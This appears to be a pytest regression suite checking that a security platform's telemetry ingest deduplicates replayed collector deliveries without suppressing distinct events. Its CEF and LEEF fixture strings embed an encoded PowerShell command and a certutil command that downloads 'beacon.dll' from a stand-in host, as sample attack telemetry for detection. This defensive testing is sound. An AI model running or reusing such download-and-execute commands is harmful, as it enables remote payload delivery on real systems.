"""P0 · Collector delivery idempotency — the replay defect must stay fixed.

Regression guard for the finding from the preview collector proof: replaying a
byte-identical collector envelope created a SECOND raw row, canonical event,
detection and incident, because incident campaign consolidation is keyed on
`(tenant_id, endpoint_id)` and `_endpoint_scope()` is None for non-endpoint
sources such as CEF firewall telemetry.

The fix is at the ingest layer (`services.ingest_idempotency`), which is
endpoint-agnostic: a retry is recognised from the delivery identity alone.

These tests run against the ASGI app so the real dependency graph and the real
pipeline execute — a unit test on `event_identity` alone would not prove that
no second incident is written.
"""
from __future__ import annotations

import os
import uuid

import pytest
from fastapi.testclient import TestClient
from pymongo import MongoClient

os.environ.setdefault("DB_NAME", "test_database")

from server import app  # noqa: E402
from services.ingest_idempotency import (  # noqa: E402
    COLLECTION as DEDUPE_COLLECTION, claim, event_identity)

_db = MongoClient(os.environ["MONGO_URL"])[os.environ["DB_NAME"]]

TENANT = f"dedupe-{uuid.uuid4().hex[:8]}"
TENANT_B = f"dedupe-b-{uuid.uuid4().hex[:8]}"

# Non-endpoint CEF firewall telemetry — the exact payload shape that exposed
# the defect.  Fires DET-EX-001, VEEE 70 (SUSPICIOUS), crosses the gate.
CEF_LINE = (
    "<14>Jun 10 12:40:11 fw01 CEF:0|Palo Alto Networks|PAN-OS|10.2|4001|"
    "encoded powershell observed|8|src=10.4.9.22 spt=51455 dst=203.0.113.55 "
    "dpt=443 proto=TCP dvchost=HYD-FW01 duser=r.mehta dproc=powershell.exe "
    "dpid=4412 cs1Label=CommandLine "
    "cs1=powershell.exe -enc SQBFAFgAJwBoAHQAdABwAA== act=alert"
)
# Endpoint-shaped telemetry (LEEF, process execution on a named host).
LEEF_LINE = (
    "<134>Jun 10 12:42:31 srv22 LEEF:2.0|IBM|QRadar EDR|3.1|4711|x09|"
    "cat=process\tdevTime=1780488344000\tsrc=10.4.9.31\tdst=198.51.100.7\t"
    "srcPort=44210\tdstPort=8443\tproto=TCP\tusrName=svc_backup\t"
    "identHostName=HYD-SRV22\tprocessName=certutil.exe\t"
    "cmd=certutil.exe -urlcache -split -f http://198.51.100.7/beacon.dll\tsev=9"
)


@pytest.fixture(scope="module")
def client():
    with TestClient(app) as c:
        yield c


def _login(c):
    r = c.post("/api/auth/login", json={"email": os.environ["ADMIN_EMAIL"],
                                        "password": os.environ["ADMIN_PASSWORD"]})
    assert r.status_code == 200, r.text
    return {"Authorization": f"Bearer {r.json()['access_token']}"}


@pytest.fixture(scope="module")
def env(client):
    """One collector per proof tenant, plus a second collector in TENANT."""
    auth = _login(client)
    out = {"auth": auth}
    for key, ten in (("collector", TENANT), ("collector_b", TENANT_B),
                     ("collector_2", TENANT)):
        r = client.post("/api/xdr/collectors",
                        headers={**auth, "X-Tenant-Id": ten},
                        json={"name": f"dedupe-{uuid.uuid4().hex[:8]}",
                              "protocol": "webhook"})
        assert r.status_code == 200, r.text
        out[key] = r.json()["data"]["id"]
    yield out
    for ten in (TENANT, TENANT_B):
        _db["xdr_collectors"].delete_many({"tenant_id": ten})
        _db["xdr_canonical_events"].delete_many({"tenant_id": ten})
        _db["xdr_canonical_evidence"].delete_many({"tenant_id": ten})
        _db["workspace_cases"].delete_many({"tenant_id": ten})
        _db[DEDUPE_COLLECTION].delete_many({"tenant_id": ten})


def _env(collector, tenant=TENANT, sei="evt-1", line=CEF_LINE, source="fw"):
    return {"tenant_id": tenant, "collector_id": collector,
            "collection_method": "webhook", "source": source,
            "connector_id": "webhook-dedupe", "parser_version": "cef-leef/1.0",
            "event_type": "alert", "source_event_id": sei,
            "source_timestamp": "2026-06-10T12:40:11Z",
            "raw": {"line": line, "payload_format": "cef"}}


def _post(client, envelope, tenant=TENANT, collector_key=None):
    """Authenticate with the machine principal path where possible; the
    collector API key is not needed for this suite, so the admin JWT drives
    the control plane and the ingest gate identically."""
    hdrs = {**_login(client), "X-Tenant-Id": tenant}
    r = client.post("/api/xdr/ingest/telemetry", headers=hdrs,
                    json={"envelopes": [envelope]})
    assert r.status_code == 200, r.text
    return r.json()


def _first(receipt):
    return (receipt.get("reasoning") or [{}])[0]


def _counts(tenant, sei=None):
    q = {"tenant_id": tenant}
    if sei:
        q["source_event_id"] = sei
    return {
        "raw": _db["xdr_canonical_events"].count_documents(q),
        "canonical": _db["xdr_canonical_evidence"].count_documents(
            {"tenant_id": tenant}),
        "incidents": _db["workspace_cases"].count_documents(
            {"tenant_id": tenant, "doc_type": "xdr_incident"}),
    }


# ── identity unit contract ────────────────────────────────────────
def test_identity_is_stable_across_transport_metadata():
    a = event_identity(TENANT, "col_1", "fw", "e1", {"line": CEF_LINE})
    b = event_identity(TENANT, "col_1", "fw", "e1", {"line": CEF_LINE})
    assert a["key"] == b["key"]


def test_identity_separates_tenant_collector_sei_and_payload():
    base = dict(tenant_id=TENANT, collector_id="col_1", source="fw",
                source_event_id="e1", raw={"line": CEF_LINE})
    k = event_identity(**base)["key"]
    assert event_identity(**{**base, "tenant_id": TENANT_B})["key"] != k
    assert event_identity(**{**base, "collector_id": "col_2"})["key"] != k
    assert event_identity(**{**base, "source_event_id": "e2"})["key"] != k
    assert event_identity(**{**base, "raw": {"line": LEEF_LINE}})["key"] != k


def test_claim_is_atomic_and_survives_repeat():
    ident = event_identity(TENANT, "col_claim", "fw",
                           f"c-{uuid.uuid4().hex[:8]}", {"line": "x"})
    assert claim(ident)[0] == "FRESH"
    state, rec = claim(ident)
    # The first claim still holds a live lease, so a second copy of the same
    # delivery is refused rather than started.
    assert state == "IN_FLIGHT"
    assert rec["delivery_count"] == 2
    assert _db[DEDUPE_COLLECTION].find_one(
        {"key": ident["key"]})["duplicate_count"] == 1
    _db[DEDUPE_COLLECTION].delete_one({"key": ident["key"]})


# ── 1 · identical retry, same source_event_id ─────────────────────
def test_identical_retry_creates_no_second_chain(client, env):
    sei = f"retry-{uuid.uuid4().hex[:8]}"
    e = _env(env["collector"], sei=sei)
    first = _post(client, e)
    f1 = _first(first)
    assert f1["status"] == "REASONED", first
    assert f1["incident_created"] is True, first
    before = _counts(TENANT, sei)
    assert before["raw"] == 1

    second = _post(client, dict(e))
    f2 = _first(second)
    assert second["duplicates"] == 1, second
    assert f2["status"] == "DUPLICATE"
    assert f2["incident_created"] is False
    assert f2["incident_id"] == f1["incident_id"], "retry must point at the original"
    assert f2["duplicate_of_trace_id"] == f1["trace_id"]
    assert f2["delivery_count"] == 2
    assert second["reasoned"] == 0
    assert second["observations_created"] == 0
    assert second["incidents_promoted"] == []

    after = _counts(TENANT, sei)
    assert after["raw"] == before["raw"], "a second RAW row was written"
    assert after["canonical"] == before["canonical"], "a second CANONICAL event was written"
    assert after["incidents"] == before["incidents"], "a second INCIDENT was created"


def test_retry_is_recorded_as_provenance_on_the_original_incident(client, env):
    sei = f"prov-{uuid.uuid4().hex[:8]}"
    e = _env(env["collector"], sei=sei)
    inc_id = _first(_post(client, e))["incident_id"]
    _post(client, dict(e))
    _post(client, dict(e))
    doc = _db["workspace_cases"].find_one({"id": inc_id})
    assert doc["duplicate_delivery_count"] == 2
    assert doc["last_duplicate_delivery_at"]
    rec = _db[DEDUPE_COLLECTION].find_one({"incident_id": inc_id})
    assert rec["delivery_count"] == 3 and rec["duplicate_count"] == 2
    assert rec["canonical_event_id"] and rec["trace_id"]


def test_many_retries_still_yield_exactly_one_incident(client, env):
    sei = f"many-{uuid.uuid4().hex[:8]}"
    e = _env(env["collector"], sei=sei)
    ids = set()
    for _ in range(5):
        ids.add(_first(_post(client, dict(e)))["incident_id"])
    assert len(ids) == 1
    assert _db["xdr_canonical_events"].count_documents(
        {"tenant_id": TENANT, "source_event_id": sei}) == 1


# ── 2 · same payload, DIFFERENT source_event_id → distinct ────────
def test_same_payload_different_source_event_id_is_not_suppressed(client, env):
    a = _env(env["collector"], sei=f"a-{uuid.uuid4().hex[:8]}")
    b = _env(env["collector"], sei=f"b-{uuid.uuid4().hex[:8]}")
    r1, r2 = _post(client, a), _post(client, b)
    assert r2["duplicates"] == 0, "a genuinely repeated security event was suppressed"
    assert _first(r2)["status"] == "REASONED"
    assert _first(r1)["trace_id"] != _first(r2)["trace_id"]
    assert _db["xdr_canonical_events"].count_documents(
        {"tenant_id": TENANT,
         "source_event_id": {"$in": [a["source_event_id"],
                                     b["source_event_id"]]}}) == 2


# ── 3 · same event, DIFFERENT tenant → distinct ───────────────────
def test_same_event_from_different_tenant_is_not_deduped(client, env):
    sei = f"xt-{uuid.uuid4().hex[:8]}"
    r1 = _post(client, _env(env["collector"], sei=sei), tenant=TENANT)
    r2 = _post(client, _env(env["collector_b"], tenant=TENANT_B, sei=sei),
               tenant=TENANT_B)
    assert r2["duplicates"] == 0
    assert _first(r2)["status"] == "REASONED"
    assert _first(r1)["incident_id"] != _first(r2)["incident_id"]
    assert _db["xdr_canonical_events"].count_documents(
        {"tenant_id": TENANT_B, "source_event_id": sei}) == 1


# ── 4 · same source_event_id, DIFFERENT collector → distinct ──────
def test_same_source_event_id_from_different_collector_is_not_deduped(client, env):
    sei = f"xc-{uuid.uuid4().hex[:8]}"
    r1 = _post(client, _env(env["collector"], sei=sei))
    r2 = _post(client, _env(env["collector_2"], sei=sei))
    assert r2["duplicates"] == 0
    assert _first(r2)["status"] == "REASONED"
    assert _first(r1)["trace_id"] != _first(r2)["trace_id"]


# ── 5/6 · endpoint-shaped AND non-endpoint telemetry ──────────────
@pytest.mark.parametrize("line,label", [(CEF_LINE, "non-endpoint-cef-firewall"),
                                        (LEEF_LINE, "endpoint-shaped-leef")])
def test_dedupe_is_endpoint_agnostic(client, env, line, label):
    """The defect only manifested for sources whose canonical has no
    platform-minted endpoint_id.  Idempotency must hold for BOTH, because it
    is keyed on the delivery identity, never on endpoint identity."""
    sei = f"{label}-{uuid.uuid4().hex[:8]}"
    e = _env(env["collector"], sei=sei, line=line)
    first = _post(client, e)
    assert _first(first)["status"] == "REASONED", first
    second = _post(client, dict(e))
    assert second["duplicates"] == 1, (label, second)
    assert _first(second)["status"] == "DUPLICATE"
    assert _db["xdr_canonical_events"].count_documents(
        {"tenant_id": TENANT, "source_event_id": sei}) == 1


# ── 7 · persistence, not in-memory state ──────────────────────────
def test_dedupe_record_is_persisted_not_in_memory(client, env):
    """The claim lives in MongoDB under a UNIQUE index, so a retry after a
    process restart is still recognised.  Proven here by reading the record
    from a SEPARATE client connection and re-asserting the unique index."""
    sei = f"persist-{uuid.uuid4().hex[:8]}"
    e = _env(env["collector"], sei=sei)
    _post(client, e)
    fresh_conn = MongoClient(os.environ["MONGO_URL"])[os.environ["DB_NAME"]]
    ident = event_identity(TENANT, env["collector"], "fw", sei, e["raw"])
    rec = fresh_conn[DEDUPE_COLLECTION].find_one({"key": ident["key"]})
    assert rec is not None, "claim is not durable across connections"
    assert rec["status"] == "COMPLETED"
    idx = fresh_conn[DEDUPE_COLLECTION].index_information()
    assert any(v.get("unique") and v["key"][0][0] == "key"
               for v in idx.values()), "dedupe key is not uniquely indexed"


def test_counters_do_not_count_a_retry_as_new_telemetry(client, env):
    sei = f"cnt-{uuid.uuid4().hex[:8]}"
    e = _env(env["collector"], sei=sei)
    _post(client, e)
    before = _db["xdr_collectors"].find_one({"id": env["collector"]})
    _post(client, dict(e))
    after = _db["xdr_collectors"].find_one({"id": env["collector"]})
    assert after["events_received"] == before["events_received"], (
        "a retry inflated the locked CONNECTED evidence counter")
    assert after["events_normalized"] == before["events_normalized"]
    assert after.get("events_duplicate", 0) > before.get("events_duplicate", 0)
